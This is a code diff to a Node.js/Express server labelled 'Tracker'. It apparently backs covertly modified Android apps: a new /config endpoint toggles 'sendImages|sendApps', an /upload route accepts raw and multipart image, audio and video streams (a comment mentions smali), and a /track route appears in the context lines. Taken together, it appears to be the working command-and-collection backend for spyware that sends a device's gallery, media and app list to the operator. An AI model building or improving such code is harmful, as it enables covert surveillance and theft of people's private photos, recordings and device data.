@@ -19,7 +19,7 @@ if (!fs.existsSync(UPLOAD_DIR)) {
 
 const upload = multer({
   dest: UPLOAD_DIR,
-  limits: { fileSize: 50 * 1024 * 1024 } // 50MB future safe
+  limits: { fileSize: 50 * 1024 * 1024 }
 });
 
 app.use('/uploads', express.static(UPLOAD_DIR));
@@ -54,6 +54,13 @@ function parseApps(input) {
   }
 }
 
+/* ================= 🔥 CONFIG (NEW) ================= */
+
+app.get('/config', (req, res) => {
+  // format: sendImages|sendApps
+  res.send("1|1"); 
+});
+
 /* ================= TRACK ================= */
 
 app.get('/track', (req, res) => {
@@ -82,7 +89,7 @@ app.post('/upload', (req, res) => {
 
   const contentType = req.headers['content-type'] || "";
 
-  // 🔴 MULTIPART (audio/video/doc/image)
+  // MULTIPART
   if (contentType.includes("multipart")) {
     return upload.single('file')(req, res, () => {
 
@@ -109,13 +116,12 @@ app.post('/upload', (req, res) => {
     });
   }
 
-  // 🔥 RAW UPLOAD (smali / direct stream)
+  // RAW STREAM
   let ext = ".jpg";
 
-  if (contentType.includes("image")) ext = ".jpg";
   if (contentType.includes("png")) ext = ".png";
-  if (contentType.includes("audio")) ext = ".mp3";
-  if (contentType.includes("video")) ext = ".mp4";
+  else if (contentType.includes("audio")) ext = ".mp3";
+  else if (contentType.includes("video")) ext = ".mp4";
 
   const fileName = Date.now() + ext;
   const filePath = path.join(UPLOAD_DIR, fileName);
@@ -229,7 +235,7 @@ app.get('/health', (req, res) => {
 /* ================= HOME ================= */
 
 app.get('/', (req, res) => {
-  res.send("Tracker running (images + audio + video + docs)");
+  res.send("Tracker running (config + gallery + uploads)");
 });
 
 /* ================= START ================= */
